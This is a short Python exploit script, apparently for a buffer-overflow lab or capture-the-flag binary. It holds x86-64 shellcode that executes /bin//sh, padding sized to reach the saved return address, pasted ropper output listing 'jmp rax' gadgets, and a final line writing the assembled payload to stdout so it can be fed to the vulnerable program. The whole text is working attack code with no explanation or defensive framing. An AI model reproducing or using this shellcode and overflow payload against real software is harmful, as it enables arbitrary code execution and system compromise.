import struct
import sys

shellcode = (b"\x48\x31\xf6"
            b"\x56"
            b"\x48\xbf\x2f\x62\x69\x6e\x2f"
            b"\x2f\x73\x68"
            b"\x57"
            b"\x54"
            b"\x5f"
            b"\x48\x31\xc0"
            b"\xb0\x3b"
            b"\x0f\x05")

#padding until return address
padding = bytes("A" * (128 - len(shellcode) + 8), "utf-8")

'''
ropper output
JMP Instructions
================

0x0000000000400481: jmp rax; 
0x00000000004004c3: jmp rax; 
0x00000000004005f4: call rax; 
'''
#shellcode_addr = struct.pack("<Q", 0x7fffffffe4a0)

jmp_eax_addr = b"\x81\x04\x40\x00"

sys.stdout.buffer.write(shellcode + padding + jmp_eax_addr)
